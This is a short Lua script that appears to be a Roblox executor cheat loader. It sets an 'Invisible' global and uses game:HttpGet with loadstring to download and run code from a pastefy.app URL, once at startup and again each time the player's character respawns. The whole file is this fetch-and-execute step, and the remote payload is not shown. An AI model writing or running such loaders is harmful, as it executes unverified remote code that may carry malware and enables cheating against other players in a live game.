_G.Invisible = true

local function executeScript()
    loadstring(game:HttpGet('https://pastefy.app/wFnuJXam/raw'))()
end


game.Players.LocalPlayer.CharacterAdded:Connect(function()
    wait(1) 
    executeScript()
end)

executeScript()
